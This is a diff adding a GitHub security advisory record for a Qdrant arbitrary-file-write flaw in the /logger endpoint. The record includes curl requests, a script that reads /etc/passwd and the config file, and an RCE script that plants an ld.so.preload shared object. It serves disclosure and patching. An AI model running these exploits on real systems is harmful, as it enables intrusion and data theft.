@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-f632-vm87-2m2f",
+  "repo": {
+    "cve_id": "CVE-2026-25628",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.5,
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-73"
+    ],
+    "description": "### Summary\r\nIt is possible to append to arbitrary files via /logger endpoint. Minimal privileges are required (read-only access). Tested on Qdrant 1.15.5\r\n\r\n### Details\r\n`POST /logger`\r\n([Source code link](https://github.com/qdrant/qdrant/blob/48203e414e4e7f639a6d394fb6e4df695f808e51/src/actix/api/service_api.rs#L195))\r\nendpoint accepts an attacker-controlled `on_disk.log_file` path.\r\n\r\nThere are no authorization checks (but authentication check is present).\r\n\r\nThis can be exploited in the following way: if configuration directory is\r\nwritable and `config/local.yaml` does not exist, set log path to\r\n`config/local.yaml` and send a request with a log injection payload. I've used\r\n`PATCH /collections` endpoint with an invalid collection name to inject valid\r\nyaml.\r\n\r\nAfter running the PoC, the content of `config/local.yaml` will be:\r\n\r\n```yaml\r\n2025-11-11T23:52:22.054804Z  INFO actix_web::middleware::logger: 172.18.0.1 \"POST /logger HTTP/1.1\" 200 57 \"-\" \"python-requests/2.32.5\" 0.009422\r\n2025-11-11T23:52:22.056962Z  INFO storage::content_manager::toc::collection_meta_ops: Updating collection hui\r\nservice:\r\n    static_content_dir: ..\r\n\r\n2025-11-11T23:52:22.057530Z  INFO actix_web::middleware::logger: 172.18.0.1 \"PATCH /collections/hui%0Aservice:%0A%20%20static_content_dir:%20..%0A HTTP/1.1\" 404 113 \"-\" \"python-requests/2.32.5\" 0.001391\r\n```\r\n\r\nYou can see that some junk log lines are present, but they don't matter as this\r\nis still valid yaml.\r\n\r\nAfter that, if qdrant is restarted (via legitimate means or by a OOM/crash),\r\nthen `local.yaml` config will have higher priority and\r\n`service.static_content_dir` will be set to `..`. In a container environment,\r\nthis lets us read all files via the web UI path.\r\n\r\nAlso overriding config file may let the attacker raise its privileges with a\r\ncustom master key (remember that lowest privileges are required to access the\r\nvulnerable endpoint).\r\n\r\nRelevant requests:\r\n\r\n1. Enable on-disk logging to the config file:\r\n\r\n```bash\r\ncurl -sS -X POST \"http://localhost:6333/logger\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{\r\n    \"log_level\":\"INFO\",\r\n    \"on_disk\":{\r\n      \"enabled\":true,\r\n      \"format\":\"text\",\r\n      \"log_level\":\"INFO\",\r\n      \"buffer_size_bytes\":1,\r\n      \"log_file\":\"config/local.yaml\"\r\n    }\r\n  }'\r\n```\r\n\r\n2. Inject YAML via a request that logs newlines (URL-encoded):\r\n\r\n```bash\r\ncurl -sS -X PATCH \"http://localhost:6333/collections/hui%0aservice:%0a%20%20static_content_dir:%20..%0a\" \\\r\n  -H \"Content-Type: application/json\" \\\r\n  -d '{}'\r\n```\r\n\r\n### Full reproduction instructions\r\n\r\n1. Start Qdrant with a writable configuration directory:\r\n\r\n```sh\r\nsudo docker run -p 6333:6333 --name qdrant-poc -d qdrant/qdrant:v1.15.5\r\n```\r\n\r\n2. Run the exploit:\r\n\r\n```sh\r\n% python3 exploit.py --url http://localhost:6333\r\n[+] Logger configured\r\n[+] Log injection successful\r\n[+] Logger disabled\r\nRestart Qdrant cluster and press Enter to continue...\r\n```\r\n\r\n3. Restart the container:\r\n\r\n```sh\r\nsudo docker restart qdrant-poc\r\n```\r\n\r\n4. Resume the exploit:\r\n\r\n```sh\r\n<press Enter>\r\n[+] Passwd file retrieved\r\n--------------------------------\r\n...\r\n--------------------------------\r\n[+] Config file retrieved\r\n--------------------------------\r\n...\r\n```\r\n\r\n## Mitigation\r\n\r\n1. Limit usage of `/logger` endpoint to users with management privileges only\r\n   (or better disable it completely).\r\n2. Restrict the path of the log file to a dedicated logs directory.\r\n\r\nThis vulnerability does not affect Qdrant cloud as the configuration directory\r\nis not writable.\r\n\r\n## Exploit code\r\n\r\n### `exploit_privesc.py`\r\n\r\n```python\r\nimport requests\r\nimport sys\r\nimport argparse\r\n\r\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\r\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\r\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\r\n\r\nargs = parser.parse_args()\r\n\r\nurl = args.url\r\n\r\nheaders = {}\r\nif args.api_key:\r\n    headers[\"api-key\"] = args.api_key\r\n\r\ns = requests.Session()\r\n\r\ns.headers.update(headers)\r\n\r\nres = s.post(\r\n    f\"{url}/logger\",\r\n    json={\r\n        \"log_level\": \"INFO\",\r\n        \"on_disk\": {\r\n            \"enabled\": True,\r\n            \"format\": \"text\",\r\n            \"log_level\": \"INFO\",\r\n            \"buffer_size_bytes\": 1,\r\n            \"log_file\": \"config/local.yaml\",\r\n        },\r\n    },\r\n)\r\nres.raise_for_status()\r\nprint(\"[+] Logger configured\")\r\n\r\n\r\nres = s.patch(\r\n    f\"{url}/collections/%0aservice:%0a%20%20static_content_dir:%20..%0a\",\r\n    json={},\r\n)\r\nerror = res.json()[\"status\"][\"error\"]\r\n\r\nif \"doesn't exist!\" in error:\r\n    print(\"[+] Log injection successful\")\r\nelse:\r\n    print(f\"[-] Error: {error}\")\r\n    sys.exit(1)\r\n\r\nres = s.post(\r\n    f\"{url}/logger\",\r\n    json={\r\n        \"on_disk\": {\r\n            \"enabled\": False,\r\n        },\r\n    },\r\n)\r\nres.raise_for_status()\r\nprint(\"[+] Logger disabled\")\r\n\r\ninput(\"Restart Qdrant cluster and press Enter to continue...\")\r\n\r\nres = s.get(f\"{url}/dashboard/etc/passwd\")\r\nres.raise_for_status()\r\nprint(\"[+] Passwd file retrieved\")\r\nprint(\"--------------------------------\")\r\nprint(res.text)\r\nprint(\"--------------------------------\")\r\n\r\nres = s.get(f\"{url}/dashboard/qdrant/config/config.yaml\")\r\nres.raise_for_status()\r\nprint(\"[+] Config file retrieved\")\r\nprint(\"--------------------------------\")\r\nprint(res.text)\r\nprint(\"--------------------------------\")\r\n```\r\n\r\n## `exploit_rce.py`\r\n\r\n```python\r\nimport requests\r\nimport argparse\r\nimport tempfile\r\nimport os\r\n\r\nTEST_COLLECTION_NAME = \"COLTEST\"\r\n\r\n\r\nparser = argparse.ArgumentParser(description=\"Exploit script for posting to Qdrant API\")\r\nparser.add_argument(\"--url\", required=False, help=\"Target URL for API\", default=\"http://localhost:6333\")\r\nparser.add_argument(\"--api-key\", required=False, help=\"API key\")\r\nparser.add_argument(\"--cmd\", default=\"touch /tmp/touched_by_rce\")\r\nparser.add_argument(\"--lib\", default=\"\")\r\n\r\nargs = parser.parse_args()\r\n\r\n\r\nassert \"'\" not in args.cmd, \"Command must not contain single quotes\"\r\nso_code = \"\"\"\r\n#include <stdlib.h>\r\n#include <unistd.h>\r\n\r\n__attribute__((constructor))\r\nvoid init() {\r\n    unlink(\"/etc/ld.so.preload\");\r\n    system(\"/bin/bash -c 'XXXXXXXX'\");\r\n}\r\n\"\"\".replace('XXXXXXXX', args.cmd)\r\n\r\nwith tempfile.TemporaryDirectory() as tmpdir:\r\n    with open(f\"{tmpdir}/cmd_code.c\", \"w\") as f:\r\n        f.write(so_code)\r\n    os.system(f'gcc -shared -fPIC -o {tmpdir}/cmd.so {tmpdir}/cmd_code.c')\r\n    cmd_so = open(f'{tmpdir}/cmd.so', \"rb\").read()\r\n\r\nurl = args.url\r\n\r\nheaders = {}\r\nif args.api_key:\r\n    headers[\"api-key\"] = args.api_key\r\n\r\ns = requests.Session()\r\n\r\ns.headers.update(headers)\r\n\r\nres = s.post(\r\n    f\"{url}/logger\",\r\n    json={\r\n        \"log_level\": \"INFO\",\r\n        \"on_disk\": {\r\n            \"enabled\": True,\r\n            \"format\": \"text\",\r\n            \"log_level\": \"INFO\",\r\n            \"buffer_size_bytes\": 1,\r\n            \"log_file\": \"/etc/ld.so.preload\",\r\n        },\r\n    },\r\n)\r\nres.raise_for_status()\r\nprint(\"[+] Logger configured\")\r\n\r\nres = s.get(\r\n    f\"{url}/:/qdrant/snapshots/{TEST_COLLECTION_NAME}/hui.so\",\r\n)\r\n\r\nprint(\"[+] Log injected\")\r\n\r\n\r\nres = s.post(\r\n    f\"{url}/logger\",\r\n    json={\r\n        \"on_disk\": {\r\n            \"enabled\": False,\r\n        },\r\n    },\r\n)\r\nres.raise_for_status()\r\nprint(\"[+] Logger disabled\")\r\n\r\n\r\nrsp = s.post(f\"{args.url}/collections/{TEST_COLLECTION_NAME}/snapshots/upload\", files={\"snapshot\": (\"hui.so\", cmd_so, \"application/octet-stream\")})\r\n\r\nprint(rsp.text)\r\n# trigger the stacktace endpoint which will run execute `/qdrant/qdrant --stacktrace`\r\n\r\ninput(\"Press Enter to continue...\")\r\nrsp = s.get(f\"{args.url}/stacktrace\")\r\nrsp.raise_for_status()\r\n```\r\n\r\n### Impact\r\nRemote code execution.\r\n",
+    "ghsa_id": "GHSA-f632-vm87-2m2f",
+    "html_url": "https://github.com/qdrant/qdrant/security/advisories/GHSA-f632-vm87-2m2f",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-f632-vm87-2m2f"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-25628"
+      }
+    ],
+    "published_at": "2026-02-05T18:10:58Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Arbitrary file write via `/logger` endpoint",
+    "updated_at": "2026-02-05T18:10:58Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "rust",
+          "name": "qdrant"
+        },
+        "patched_versions": "1.15.6",
+        "vulnerable_version_range": ">= 1.9.3, < 1.15.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "qdrant/qdrant"
+}
